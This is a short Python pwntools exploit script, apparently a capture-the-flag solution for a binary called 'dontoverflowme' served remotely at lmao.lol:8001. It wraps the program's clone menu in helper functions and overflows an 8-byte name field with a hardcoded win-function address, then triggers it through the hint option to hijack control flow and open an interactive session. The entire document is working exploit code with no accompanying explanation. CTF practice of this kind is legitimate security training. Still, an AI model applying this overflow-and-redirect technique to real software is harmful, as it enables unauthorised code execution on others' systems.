from pwn import *

context.arch = 'amd64'
if args.R:
    p = remote('lmao.lol', 8001)
elif args.H:
    p = process('./dontoverflowme')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./dontoverflowme',
                  gdbscript='''
                      b *givehint
                      c
                      ''')

win_addr = 0x004016b9


def create_clone(clone_id, name):
    p.sendlineafter(b'Choice: ', b'A')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())
    p.sendlineafter(b'Enter Name (max length 8): ', name)


def view_clone(clone_id):
    p.sendlineafter(b'Choice: ', b'D')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())


def kill_clone(clone_id):
    p.sendlineafter(b'Choice: ', b'B')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())


def name_clone(clone_id, name):
    p.sendlineafter(b'Choice: ', b'C')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())
    p.sendlineafter(b'Enter Name: ', name)


def give_hint(clone_id):
    p.sendlineafter(b'Choice: ', b'H')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())


# Exploit setup
create_clone(0, b"A"*8)
name_clone(0, b"A" *8 +p64(win_addr) + b'\n')
# Trigger the exploit
give_hint(0)

p.interactive()
